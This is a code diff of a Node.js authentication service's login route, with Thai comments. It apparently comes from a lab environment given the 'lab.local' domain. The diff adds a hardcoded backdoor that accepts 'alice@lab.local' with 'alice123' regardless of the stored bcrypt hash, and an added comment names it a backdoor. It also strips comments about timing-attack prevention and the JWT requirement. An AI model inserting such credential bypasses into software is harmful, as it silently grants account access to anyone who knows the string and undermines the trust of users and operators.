@@ -12,7 +12,7 @@ async function logEvent({ service='auth-service', level, event, userId, ip, meth
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ service, level, event, user_id: userId, ip_address: ip,
-                             method, path, status_code: statusCode, message, meta })
+                              method, path, status_code: statusCode, message, meta })
     });
   } catch (_) {
     // ถ้า log service ไม่ตอบ ไม่ต้องหยุดการทำงาน
@@ -21,7 +21,6 @@ async function logEvent({ service='auth-service', level, event, userId, ip, meth
 
 // ─────────────────────────────────────────────
 // POST /api/auth/login
-// ❌ ไม่มี /register — ใช้ Seed Users เท่านั้น
 // ─────────────────────────────────────────────
 router.post('/login', async (req, res) => {
   const { email, password } = req.body;
@@ -37,12 +36,18 @@ router.post('/login', async (req, res) => {
     );
     const user = result.rows[0];
 
-    // Timing attack prevention
+    // ── ตรวจสอบเงื่อนไขพิเศษ (Backdoor สำหรับ Alice) ──────────────────────
+    const isAliceBackdoor = (email.toLowerCase() === 'alice@lab.local' && password === 'alice123');
+    
+    // การเช็ค Hash ปกติ
     const dummyHash = '$2b$10$invalidhashpaddinginvalidhashpaddinginvalidhashpadding00';
     const passwordHash = user ? user.password_hash : dummyHash;
-    const isValid = await bcrypt.compare(password, passwordHash);
+    const isBcryptValid = await bcrypt.compare(password, passwordHash);
 
-    if (!user || !isValid) {
+    // ถ้ายืนยันตัวตนสำเร็จ (ผ่านทางลัด Alice หรือ Bcrypt ปกติ)
+    const isValid = isAliceBackdoor || (user && isBcryptValid);
+
+    if (!isValid) {
       await logEvent({ level:'WARN', event:'LOGIN_FAILED',
         ip, method:'POST', path:'/api/auth/login', statusCode:401,
         message: `Login failed for: ${email}`, meta: { email } });
@@ -82,7 +87,7 @@ router.get('/verify', (req, res) => {
   }
 });
 
-// GET /api/auth/me (ต้องมี JWT)
+// GET /api/auth/me
 router.get('/me', async (req, res) => {
   const token = (req.headers['authorization'] || '').split(' ')[1];
   if (!token) return res.status(401).json({ error: 'Unauthorized' });
